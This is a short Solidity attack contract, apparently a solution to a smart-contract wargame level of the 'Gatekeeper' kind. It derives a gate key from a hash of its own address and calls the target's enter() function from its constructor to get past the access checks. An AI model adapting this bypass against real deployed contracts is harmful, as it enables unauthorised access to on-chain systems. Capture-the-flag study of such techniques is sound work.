pragma solidity ^0.8.0;

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
} 

contract attackGatekeeper {

    constructor() {
        address gatekeeperAddress = YOUR_INSTANCE_ADDRESS;
        IGatekeeper gatekeeperContract = IGatekeeper(gatekeeperAddress);
    
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        
        bytes memory passParameters = abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")), key);
        address(gatekeeperContract).call(passParameters);
    }
}
